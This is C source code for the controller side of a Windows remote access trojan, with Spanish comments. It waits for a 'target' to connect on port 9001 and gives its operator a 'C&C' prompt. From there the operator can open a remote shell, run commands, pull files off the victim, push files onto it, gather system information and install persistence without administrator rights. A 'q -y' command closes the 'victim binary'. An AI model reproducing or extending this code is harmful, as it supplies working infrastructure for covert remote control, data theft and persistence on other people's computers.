#include <stdio.h>
#include <stdbool.h>
#include <string.h> 
#include <stdlib.h> 
#include <sys/types.h>   
#include <signal.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h> 
#include <sys/stat.h>
#include <direct.h>
#include <sys/types.h>
#include <stdio.h>
#include <shlwapi.h>
#include <locale.h>
#include "../src/base64.c"

// Upload / Download Fully functional

// Definiciones
#define SOCKBUFFER 2048

//Colores
#define GREEN   FOREGROUND_GREEN
#define RED     FOREGROUND_RED
#define BLUE    FOREGROUND_BLUE
#define YELLOW  FOREGROUND_GREEN | FOREGROUND_RED
#define PURPLE  FOREGROUND_RED | FOREGROUND_BLUE
#define CYAN    FOREGROUND_GREEN | FOREGROUND_BLUE
#define WHITE   FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE

// Prototipo
char* getSystemInformation(SOCKET targetConn, char *command);
char* decodeSystemInformation(char *codedSysInfo);
int mainFunction(int targetConn, char *clientIP, unsigned short clientPort);
int shell(SOCKET targetConn, char *clientIP, unsigned short clientPort);
int ReadAndSendFile(SOCKET targetConn, char *file, char *instruct);
int sndAndExecCmd(SOCKET targetConn, char *command, char *resp);
int downloadFunc(char *command, SOCKET targetConn, char *ip); 
int setLowPersistence(SOCKET targetConn, char *command);
int startServer();
void helpPannel();
void ctrlCHandler(int sig);
void checkStart(char *IPAddress);
void printColor(char* text, int color);
void StartSending(SOCKET targetConn, char *instruct);
void StartGetSysInfo(SOCKET targetConn, char *command);
void closeConection(SOCKET targetConn, char *command, size_t instructLen, char *clientIP, unsigned short clientPort);

char* getSystemInformation(SOCKET targetConn, char *command){
    send(targetConn, command, strlen(command), 0);
    char* recvData = malloc(SOCKBUFFER);

    while (true){
        recv(targetConn, recvData, SOCKBUFFER, 0);
        if (strstr(recvData, "end\0") == 0)
            break;
        else 
            printf("%s", recvData);
            continue;
    }
    return recvData;   
}

char* decodeSystemInformation(char *codedSysInfo){
    char* decodedSystemInfo = base64_decode(codedSysInfo);
    return decodedSystemInfo;
}


void StartGetSysInfo(SOCKET targetConn, char *command){
    char *codedSysInfo = getSystemInformation(targetConn, command);
    printf("%s", decodeSystemInformation(codedSysInfo));
}

void ctrlCHandler(int sig) {
    // Exit ctrl + c 
    printColor("\n\n\t[!] ", RED); printColor("Saliendo: Ctrl + C detectado... \n\n", YELLOW); 
    exit(1);
}

void printColor(char* text, int color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
    printf("%s", text);
    SetConsoleTextAttribute(hConsole, WHITE); // Reset to white after printing
}

void closeConection(SOCKET targetConn, char *command, size_t instructLen, char *clientIP, unsigned short clientPort){
    char formattedString1[50] = "";
    snprintf(formattedString1, sizeof(formattedString1), " %s-%u\n\n", clientIP, clientPort);
    printColor("\n\t[*>] ", YELLOW); printColor("Closing Connection to", RED); printf(" ===> "); printColor(formattedString1, YELLOW); 
    send(targetConn, command, instructLen, 0);
    closesocket(targetConn);
}
 
void checkStart(char *IPAddress){
    char formed[SOCKBUFFER];
    snprintf(formed, SOCKBUFFER, "./DATA/%s", IPAddress);
    struct stat buffer;
    if (stat("./DATA", &buffer) != 0) {
        mkdir("./DATA"); 
    }
    if (stat(formed, &buffer) != 0){
        mkdir(formed);   
    }  
}

void helpPannel(){
    printf("\n\tAvailable Commands:\n\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] shell                 -> Enter Shell Mode \n");
    printf("\t\t---------------------------------------------------------\n");  
    printf("\t\t| [!>] download <file>       -> Download from target \n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] upload <file>         -> Upload local file to target\n");
    printf("\t\t---------------------------------------------------------\n");  
    printf("\t\t| [!>] sysinfo               -> Show info from system target\n");
    printf("\t\t---------------------------------------------------------\n");  
    printf("\t\t| [!>] lowpersistence        -> Apply no root needed persistence\n");
    printf("\t\t---------------------------------------------------------\n");  
    printf("\t\t| [!>] q / exit              -> Exit the conection\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] q -y / exit -y        -> Terminate the conection (close victim binary)\n");
    printf("\t\t---------------------------------------------------------\n");

}

void StartSending(SOCKET targetConn, char *instruct){
    char *file = malloc(strlen(instruct) + 1); // Asigna memoria a 'file'
    char toReplace[] = "upload ";

    char *substr = strstr(instruct, toReplace);
    size_t remainingLength = strlen(substr + strlen(toReplace));
    memmove(file, substr + strlen(toReplace), remainingLength + 1);
    ReadAndSendFile(targetConn, file, instruct);

}

int ReadAndSendFile(SOCKET targetConn, char *file, char *instruct){
    setlocale(LC_ALL, "en_US.UTF-8");

    FILE *ptr;
    // Abrimos el archivo en modo de lectura
    ptr = fopen(file, "rb");

    if (ptr == NULL) {
        printColor("\n\t[!>] ", RED); printColor("No se puede abrir el archivo.\n\n", YELLOW);
        //send(conn, "No se puede abrir el archivo.\n", strlen("No se puede abrir el archivo.\n"), 0);
        send(targetConn, "end\0", strlen("end\0"), 0);
        return 1;
    } 
    
    send(targetConn, instruct, strlen(instruct), 0); 
    char buffer[SOCKBUFFER];  // Búfer para leer desde el archivo

    // Inicializamos los búferes con valores nulos 
    memset(buffer, 0, sizeof(buffer));

    // Lee el archivo en búferes y codifícalo en Base64 antes de enviarlo
    size_t bytesRead;

    while ((bytesRead = fread(buffer, 1, SOCKBUFFER, ptr)) > 0) { 
        printf("%s\n", buffer);
        char *base64Encoded = base64_encode(buffer, strlen(buffer));

        send(targetConn, base64Encoded, strlen(base64Encoded), 0); 
        free(base64Encoded);  // Liberar la memoria asignada por base64_encode
    }

    // Cierra el archivo
    fclose(ptr); 
    Sleep(300);
    send(targetConn, "end\0", strlen("end\0"), 0); 
    printColor("\n\t[*>] ", YELLOW); printColor("File Uploaded Successfully.\n\n", BLUE);
    return 0;
}

int sndAndExecCmd(SOCKET targetConn, char *command, char *resp){ 
    //Limpiar buffer
    memset(resp, 0, sizeof(resp));
    // Enviar comando
    send(targetConn, command, strlen(command), 0);
    
    while (true) {
        recv(targetConn, resp, SOCKBUFFER, 0);
        if (strcmp(resp, "end\0") == 0){
            break;
            
        } else {
            printf("%s", resp);
            memset(resp, 0, SOCKBUFFER);

        }
    }
    return 0;
}

int shell(SOCKET targetConn, char *clientIP, unsigned short clientPort){
    // Variables Necesarias
    char command[255] = "";
    char resp[SOCKBUFFER];
    char formattedString[50] = "";

    printColor("\n\t[*>] ", YELLOW); printColor("Entering Shell Mode\n\n", BLUE);
    send(targetConn, "shell", strlen("shell"), 0);

    snprintf(formattedString, sizeof(formattedString), "* %s>: ", clientIP);

    while (true) {

        printColor("\n<*", YELLOW); printColor(" Shell ", RED); printColor(formattedString, YELLOW);
        //printf("\n%s<*%s Shell %s* %s>: %s ", YELLOW, RED, YELLOW, clientIP, end);
        fgets(command, sizeof(command), stdin); 

        // Eliminar el carácter de nueva línea si está presente
        size_t command_len = strlen(command);
        if (command_len > 0 && command[command_len - 1] == '\n') {
            command[command_len - 1] = '\0';
        }

        // Enviar el mensaje:
        if (strcmp(command, "q") == 0){ 
 
            printColor("\n\t[*>] ", YELLOW); printColor("Exiting Shell Mode\n\n", BLUE);
            send(targetConn, command, strlen(command), 0);
            break;

        } else if (strstr(command, "exit") != NULL){ 
            printColor("\n\t[!>] ", RED); printColor("For exit shell mode type 'q'\n\n", YELLOW);

        } else if (strlen(command) == 0){
            continue; 
        } else{
            sndAndExecCmd(targetConn, command, resp);
        }
    }    
    return 0;

}

int downloadFunc(char *command, SOCKET targetConn, char *ip) {
    // Variables necesarias
    char formed[100];
    snprintf(formed, SOCKBUFFER, " check path -> ./DATA/%s", ip);
    char *file = malloc(strlen(command) + 1); // Asigna memoria a 'file'
    char toReplace[] = "download ";

    char *substr = strstr(command, toReplace);
    size_t remainingLength = strlen(substr + strlen(toReplace));
    memmove(file, substr + strlen(toReplace), remainingLength + 1);
    printColor("\n\t[*>] ", YELLOW); printColor("Downloading file ", BLUE); printColor(file, YELLOW); printColor(formed, BLUE); printf("\n");
    send(targetConn, command, strlen(command), 0);

    // Lógica para descargar archivos
    char recvData[SOCKBUFFER];  // Utilizamos un búfer para recibir datos

    // Inicializamos el búfer con valores nulos para evitar problemas con strcat
    memset(recvData, 0, sizeof(recvData));

    // Abre el archivo para escritura
    char *base = PathFindFileName(file);
    snprintf(formed, SOCKBUFFER, "./DATA/%s/%s", ip, base);
    FILE *fp = fopen(formed, "w");

    if (fp == NULL) {
        // Manejo de error de apertura de archivo
        free(file);
        return 1;
    }

    while (true) {
        int bytesRead = recv(targetConn, recvData, SOCKBUFFER, 0);

        if (bytesRead <= 0) {
            // Manejo de error de recepción
            printf("Error en la recepción de datos.\n");
            fclose(fp);
            free(file);
            return 1;
        }

        if (strstr(recvData, "end\0") != NULL) {
            // Recibido el indicador de final "end\0"
            break;
        } else {
            // Escribir los datos recibidos en el archivo
            char *decodedData = base64_decode(recvData);
            fwrite(decodedData, 1, strlen(decodedData), fp);
            free(decodedData);
        }
    }

    // Cierra el archivo
    fclose(fp);
    free(file);
    return 0;
}

int setLowPersistence(SOCKET targetConn, char *command){
    send(targetConn, command, strlen(command), 0);
    char* recvData = malloc(SOCKBUFFER);    

    recv(targetConn, recvData, SOCKBUFFER, 0);
    if (strcmp("error", recvData) == 0){
        printColor("\n\n\t[!>] ", RED); printColor("Error gettin low persistence...", YELLOW);
    }

    else if (strcmp("exito", recvData) == 0){
        printColor("\n\t[!>] ", YELLOW); printColor("Low persistence setted succsessfully...\n", BLUE);
    }
}

int mainFunction(int targetConn, char *clientIP, unsigned short clientPort){
    char command[SOCKBUFFER] = "";
    char resp[SOCKBUFFER];
    char formattedString[50] = "";

    //Estructura de carpetas:
    checkStart(clientIP);

    snprintf(formattedString, sizeof(formattedString), "* %s>: ", clientIP);
    while (true){
        printColor("\n<*", YELLOW); printColor(" C&C ", RED); printColor(formattedString, YELLOW); 
        fgets(command, sizeof(command), stdin); 
        
        // Eliminamos "\n" del final
        size_t instructLen = strlen(command);
        if (instructLen > 0 && command[instructLen -1] == '\n'){
            command[instructLen - 1] = '\0';
        }

        if (strcmp(command, "exit") == 0 || strcmp(command, "q") == 0){
            closeConection(targetConn, command, instructLen, clientIP, clientPort);
            break;
        
        } else if(strcmp(command, "exit -y") == 0 || strcmp(command, "q -y") == 0){
            closeConection(targetConn, command, instructLen, clientIP, clientPort);
            break;

        } else { 
            // Panel de ayuda
            if (strcmp(command, "help") == 0 || strcmp(command, "h") == 0){
                helpPannel();              

            // Descargar Archivo remoto
            } else if (strstr(command, "download") != NULL){
                downloadFunc(command, targetConn, clientIP); 
            
            // Entrar en modo shell
            } else if (strcmp(command, "shell") == 0){
                shell(targetConn, clientIP, clientPort);
            
            // Ejecutar comando 
            } else if (strstr(command, "exec") != NULL){
                char resp[SOCKBUFFER];
                sndAndExecCmd(targetConn, command, resp); 
            
            // Subir Archivo local
            } else if(strstr(command, "upload") != NULL){
                StartSending(targetConn, command);
                
            // Comando no reconocido
            } else if (strcmp(command, "sysinfo") == 0){
                StartGetSysInfo(targetConn, command);
                
            } else if (strcmp(command, "lowpersistence") == 0){
                setLowPersistence(targetConn, command);
        
            } else {
                printColor("\n\t[!>] ", RED); printColor("Instruct Not Known...\n", YELLOW);
            }
        }
    }
    return 0;
}

int startServer(){
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        perror("Failed to initialize Winsock");
        exit(1);
    }

    // Creamos el socket del cliente
    SOCKET serverSock = socket(AF_INET, SOCK_STREAM, 0);

    // Definimos el client addres
    struct sockaddr_in servAddr;

    servAddr.sin_family = AF_INET;
    servAddr.sin_port = htons(9001);
    servAddr.sin_addr.s_addr = INADDR_ANY;

    // Escuchamos en la IP y puerto:
    bind(serverSock, (struct sockaddr*)&servAddr,
                sizeof(servAddr));

    // Escuchamos para conexiones
    listen(serverSock, 1);

    // Integer para mantener el socket cliente
    SOCKET targetConn = accept(serverSock, NULL, NULL);

    // Obtenemos la dirección IP del cliente
    struct sockaddr_in clientAddr;
    int clientAddrLen = sizeof(clientAddr);
    getpeername(targetConn, (struct sockaddr*)&clientAddr, &clientAddrLen);

    char clientIP[16];  // String para almacenar la dirección IP
    strcpy(clientIP, inet_ntoa(clientAddr.sin_addr));

    // Obtenemos el puerto del cliente
    unsigned short clientPort = ntohs(clientAddr.sin_port);

    //printf("\t%s[>]%s New Connection From: %s %s-%u\n\n", YELLOW, RED, end, clientIP, clientPort);
    printColor("\t[>] ", YELLOW); printColor("New Connection From: ", RED); printf("%s-%u\n", clientIP, clientPort);
 
    mainFunction(targetConn, clientIP, clientPort);
    

}



int main(int argc, char const* argv[]){
    // Atrapamos ctrl + c 
    if (signal(SIGINT, ctrlCHandler) == SIG_ERR) {
        perror("Error al configurar el manejador de señales");
        exit(EXIT_FAILURE);
    }

    //printf("%s\n[!>] %sWaiting For target to connect...%s\n\n", YELLOW, RED, end); 
    printColor("\n[!>] ", YELLOW); printColor("Waiting For target to connect...\n\n", RED);
    startServer();
    return 0;

}
